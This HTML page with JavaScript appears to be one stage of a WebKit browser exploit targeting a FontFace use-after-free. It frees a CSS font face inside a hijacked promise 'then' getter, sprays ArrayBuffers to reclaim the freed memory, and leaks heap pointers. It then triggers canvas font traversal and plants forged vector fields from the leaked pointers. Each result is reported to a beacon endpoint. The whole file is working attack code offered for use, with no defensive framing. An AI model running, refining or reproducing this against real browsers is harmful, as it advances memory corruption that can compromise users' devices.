<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P727 — Slab Spectrum Scanner & Canvas Font Traversal Scout</title>
<script>
'use strict';
/* ============================================================
 * P727 — Slab Spectrum Scanner & Canvas Font Traversal Scout
 *
 * Ground Truth from P726:
 * - 100% deterministic reclaim at buffer #68 with 14 non-zero words.
 * - q11 (m_buffer) = 0x000000100089cfb0 (genuine heap pointer at +3,840B).
 * - q12 (m_capacity/size) = 0x2000000000.
 * - q13 (WeakPtr) = 0x00000010007e9d40.
 *
 * Objectives of P727:
 * Phase 1: Spectrum Scan across ALL 80 sprayed ArrayBuffers.
 *          Identify which other buffers in the spray received engine writes
 *          (vtable pointers, CSSFontFaceSource, or backing buffers).
 * Phase 2: Canvas Font Traversal Probe.
 *          Force WebKit to resolve trFam via HTML5 Canvas 2D metrics:
 *            ctx.font = '20px trFam';
 *            ctx.measureText('GH');
 *          Monitor diffSnap across VIEW_B to see if WebKit updates
 *          glyphs, status, or traversal state in our reclaimed slab!
 * Phase 3: Controlled Vector Traversal with signature pointers.
 * ============================================================ */

function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }

function b(tag,data){ try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P727-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
  x.send(null);}catch(e){} }

function log(s){
  var el = document.getElementById('out');
  if(el) el.textContent += s + '\n';
}

var P58 = null, P68 = null;
var FACE_B = null, BUF_B = null, VIEW_B = null;
var ALL_ABS = [];

function snap(){
  if(!VIEW_B) return [];
  var arr = [];
  for(var q=0; q<24; q++) arr.push(VIEW_B[q]);
  return arr;
}

function diffSnap(pre){
  if(!VIEW_B || !pre.length) return 'none';
  var ch = [];
  for(var q=0; q<24; q++){
    if(VIEW_B[q] !== pre[q]){
      ch.push('q' + q + '=0x' + h16(VIEW_B[q]));
    }
  }
  return ch.length ? ch.join(',') : 'none';
}

function run(){
  b('BOOT','p727-spectrum-scout');
  log('=== P727 Slab Spectrum Scanner & Canvas Font Traversal Scout ===\n');

  /* Step 1: Baseline Leak */
  log('[Step 1] Baseline heap leak...');
  doLeak(function(){
    log('P58 = 0x' + h16(P58));
    log('P68 = 0x' + h16(P68) + '\n');

    /* Step 2: Instrumented Reclaim */
    log('[Step 2] Executing deterministic reclaim...');
    doReclaim(function(){
      /* Step 3: Full Spectrum Scan */
      log('\n[Step 3] Scanning all 80 ArrayBuffers for engine writes...');
      scanSpectrum();

      /* Step 4: Canvas Font Traversal Probe */
      log('\n[Step 4] Probing Canvas font resolution...');
      probeCanvasTraversal();
    });
  });
}

/* ---- Step 1: Baseline Leak ---- */
function doLeak(cb){
  b('LEAK-GO','');
  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);

  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
  document.fonts.add(face);
  void face.loaded;

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired) return undefined; fired=true;
      if(st){st.remove(); st.textContent=''; st=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk0');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl0, lk0','AB');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs.length;i++){
      var u=new Uint8Array(abs[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }

    if(best<0 || bestNz<4){
      b('LEAK-MISS','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    var v = new BigUint64Array(abs[best]);
    extractPointers(v);

    if(!P58){
      b('LEAK-NOPTR','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
    setTimeout(cb, 100);
  }, 350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY','');
  var st2 = document.createElement('style');
  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);

  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
  document.fonts.add(face2);
  void face2.loaded;

  var abs2 = [], fired2 = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired2) return undefined; fired2=true;
      if(st2){st2.remove(); st2.textContent=''; st2=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk1');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl1, lk1','CD');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs2.length;i++){
      var u=new Uint8Array(abs2[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }
    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
    var v = new BigUint64Array(abs2[best]);
    extractPointers(v);
    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
    setTimeout(cb, 100);
  }, 400);
}

function extractPointers(v){
  var LOW = BigInt('0x1000000000');
  var HIGH = BigInt('0x80000000000');
  for(var q=0;q<24;q++){
    var val = v[q];
    if(val >= LOW && val < HIGH){
      if(!P58) P58 = val;
      else if(!P68 && val !== P58) P68 = val;
    }
  }
  if(!P68) P68 = 0n;
}

/* ---- Step 2: Deterministic Reclaim ---- */
function doReclaim(cb){
  b('REC-START', 'fill_q12_q6=0x' + h16(P58));

  var stTr = document.createElement('style');
  stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
  document.head.appendChild(stTr);

  FACE_B = new FontFace('trFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
  document.fonts.add(FACE_B);
  void FACE_B.loaded;

  ALL_ABS = [];
  var firedW = false;

  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if(firedW) return undefined; firedW = true;
      if(stTr){ stTr.remove(); stTr.textContent = ''; }
      try{ document.fonts.delete(this); }catch(e){}
      document.body.offsetHeight;

      for(var k=0; k<80; k++){
        var ab = new ArrayBuffer(192);
        var view = new BigUint64Array(ab);
        view[12] = P58;
        view[6]  = P58;
        ALL_ABS.push(ab);
      }

      try{ document.fonts.check('1em trFam'); }catch(e){}
      return undefined;
    }, set: function(){}
  });

  document.fonts.load('1em trFace, trFam', 'GH');

  setTimeout(function(){
    delete FontFace.prototype.then;

    var best = -1, bestNz = 0;
    for(var i=0; i<ALL_ABS.length; i++){
      var u = new Uint8Array(ALL_ABS[i]), nz = 0;
      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
      if(nz > bestNz){ bestNz = nz; best = i; }
    }

    if(best < 0 || bestNz < 4){
      b('RECLAIM-MISS', 'nz=' + bestNz);
      log('Reclaim missed!');
      return;
    }

    BUF_B = ALL_ABS[best];
    VIEW_B = new BigUint64Array(BUF_B);

    var dumpStr = 'baseK=' + best + '|nz=' + bestNz +
                  '|q0=0x' + h16(VIEW_B[0]) + '|q11=0x' + h16(VIEW_B[11]) +
                  '|q12=0x' + h16(VIEW_B[12]) + '|q13=0x' + h16(VIEW_B[13]);
    b('RECLAIM-OK', dumpStr);
    log('Deterministic Reclaim OK: ' + dumpStr);

    setTimeout(cb, 100);
  }, 400);
}

/* ---- Step 3: Full Spectrum Scan ---- */
function scanSpectrum(){
  if(!ALL_ABS.length) return;

  var hits = [];
  for(var k=0; k<ALL_ABS.length; k++){
    var v = new BigUint64Array(ALL_ABS[k]);
    /* Count non-zero qwords other than q6 and q12 (which were initialized to P58) */
    var engineWrites = 0;
    var details = [];
    for(var q=0; q<24; q++){
      if(q === 6 || q === 12){
        /* Check if engine overwritten q6 or q12 */
        if(v[q] !== P58){
          engineWrites++;
          details.push('q' + q + '=0x' + h16(v[q]));
        }
      } else {
        if(v[q] !== 0n){
          engineWrites++;
          details.push('q' + q + '=0x' + h16(v[q]));
        }
      }
    }
    if(engineWrites > 0){
      hits.push('buf' + k + '(nz=' + engineWrites + '):' + details.slice(0, 4).join(','));
    }
  }

  b('SPECTRUM-HITS', 'total=' + hits.length + '|' + hits.join(';').slice(0, 680));
  log('Spectrum Scan: ' + hits.length + ' buffers modified by engine.');
}

/* ---- Step 4: Canvas Font Traversal Probe ---- */
function probeCanvasTraversal(){
  if(!VIEW_B) return;

  var can = document.createElement('canvas');
  can.width = 200; can.height = 50;
  var ctx = can.getContext('2d');

  /* 4A: Baseline measurement with default font */
  var m0 = ctx.measureText('HELLO');
  b('CANV-DEFAULT', 'w0=' + m0.width);

  /* 4B: Canvas measurement with trFam (the CSS font family we reclaimed!) */
  var preSnap = snap();
  var mTr = null, errTr = null;
  try {
    ctx.font = '24px trFam';
    mTr = ctx.measureText('HELLO');
  } catch(e){
    errTr = e.message;
  }
  var writesTr = diffSnap(preSnap);
  b('CANV-TRFAM', 'w=' + (mTr ? mTr.width : 'ERR') + '|err=' + (errTr||'none') + '|writes=' + writesTr);
  log('Canvas trFam measureText: w=' + (mTr ? mTr.width : 'ERR') + ', writes: ' + writesTr);

  /* 4C: Canvas measurement with trFace (the FontFace wrapper) */
  preSnap = snap();
  var mFace = null, errFace = null;
  try {
    ctx.font = '24px trFace';
    mFace = ctx.measureText('HELLO');
  } catch(e){
    errFace = e.message;
  }
  var writesFace = diffSnap(preSnap);
  b('CANV-TRFACE', 'w=' + (mFace ? mFace.width : 'ERR') + '|err=' + (errFace||'none') + '|writes=' + writesFace);
  log('Canvas trFace measureText: w=' + (mFace ? mFace.width : 'ERR') + ', writes: ' + writesFace);

  /* 4D: Trigger fillText glyph rasterization */
  preSnap = snap();
  var fillErr = 'none';
  try {
    ctx.font = '24px trFam';
    ctx.fillText('ABC', 10, 30);
  } catch(e){
    fillErr = e.message;
  }
  var writesFill = diffSnap(preSnap);
  b('CANV-FILL', 'err=' + fillErr + '|writes=' + writesFill);
  log('Canvas fillText: err=' + fillErr + ', writes: ' + writesFill);

  /* 4E: Vector Modification & Secondary Traversal */
  VIEW_B[12] = 0x0000000800000004n; /* cap=8, size=4 */
  VIEW_B[11] = P58;                 /* m_buffer = P58 */
  VIEW_B[0] = 0x0000000100000001n;
  VIEW_B[1] = P68;
  VIEW_B[2] = P58 + 0x30n;
  VIEW_B[3] = 0x0n;

  preSnap = snap();
  try {
    ctx.font = '24px trFam';
    var mPoison = ctx.measureText('HELLO');
    b('CANV-POISON-MEASURE', 'w=' + mPoison.width + '|writes=' + diffSnap(preSnap));
  } catch(e){
    b('CANV-POISON-ERR', (e.message||'').slice(0, 80));
  }

  /* 4F: Final Dump */
  var finalDump = [];
  for(var q=0; q<16; q++) finalDump.push('q' + q + '=0x' + h16(VIEW_B[q]));
  b('FINAL-STATE', finalDump.join(';').slice(0, 700));

  b('DONE', 'p727-complete');
  log('\n=== P727 Complete! ===');
}

if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script>
</head><body><pre id="out">P727 — Initializing Spectrum Scanner & Canvas Font Traversal Scout...</pre></body></html>
